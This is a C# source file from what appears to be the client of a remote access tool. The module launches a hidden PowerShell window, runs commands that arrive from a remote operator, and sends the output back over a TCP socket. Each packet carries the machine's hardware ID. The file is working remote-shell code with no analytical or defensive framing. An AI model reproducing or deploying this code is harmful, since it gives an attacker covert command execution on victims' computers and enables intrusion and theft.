using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Text;
using System.Threading;
using MessagePack;

namespace Client.HandlePacket
{
    internal static class HandlePowershell
    {
        public static Process ProcessShell;
        public static string Input { get; set; }
        public static bool CanWrite { get; set; }

        private static CultureInfo cultureInfo = CultureInfo.InstalledUICulture;

        public static void ShellWriteLine(string arg)
        {
            Input = arg;
            CanWrite = true;
        }

        public static void StarShell()
        {
            ProcessShell = new Process
            {
                StartInfo = new ProcessStartInfo("powershell")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
                    StandardErrorEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))
                }
            };
            ProcessShell.OutputDataReceived += ShellDataHandler;
            ProcessShell.ErrorDataReceived += ShellDataHandler;
            ProcessShell.Start();
            ProcessShell.BeginOutputReadLine();
            ProcessShell.BeginErrorReadLine();
            Thread.Sleep(1000);
            ProcessShell.OutputDataReceived -= ShellDataHandler;
            ProcessShell.ErrorDataReceived -= ShellDataHandler;
            ProcessShell.StandardInput.WriteLine(
                $"CHCP {Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage).CodePage}");
            Thread.Sleep(1000);
            ProcessShell.OutputDataReceived += ShellDataHandler;
            ProcessShell.ErrorDataReceived += ShellDataHandler;
            while (true)
            {
                Thread.Sleep(100);
                if (CanWrite)
                {
                    if (Input.ToLower() == "exit") break;
                    ProcessShell.StandardInput.WriteLine(Input);
                    CanWrite = false;
                }
            }

            ShellClose();
        }

        private static void ShellDataHandler(object sender, DataReceivedEventArgs e)
        {
            var Output = new StringBuilder();
            try
            {
                Output.AppendLine(e.Data);
                if (e.Data.Length == 0) return;

                var toSend = ConvertEncoding(Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage), e.Data);
                if (string.IsNullOrEmpty(toSend)|| string.IsNullOrEmpty(Output.ToString())) return;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "powershell";
                msgpack.ForcePathObject("HWID").AsString = Program.HWID;
                msgpack.ForcePathObject("ReadInput").AsString = Output.ToString();
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(ex.Message);
            }
        }

        private static string ConvertEncoding(Encoding sourceEncoding, string input)
        {
            var utf8Text = Encoding.Convert(sourceEncoding, Encoding.UTF8, sourceEncoding.GetBytes(input));
            return Encoding.UTF8.GetString(utf8Text);
        }

        public static void ShellClose()
        {
            try
            {
                if (ProcessShell != null)
                {
                    KillProcessAndChildren(ProcessShell.Id);
                    ProcessShell.OutputDataReceived -= ShellDataHandler;
                    ProcessShell.ErrorDataReceived -= ShellDataHandler;
                    CanWrite = false;
                }
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(ex.Message);
            }
        }

        private static void KillProcessAndChildren(int pid)
        {
            if (pid == 0) return;
            var searcher = new ManagementObjectSearcher
                ("Select * From Win32_Process Where ParentProcessID=" + pid);
            var moc = searcher.Get();
            foreach (var mo in moc) KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            try
            {
                var proc = Process.GetProcessById(pid);
                proc.Kill();
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(ex.Message);
            }
        }
    }
}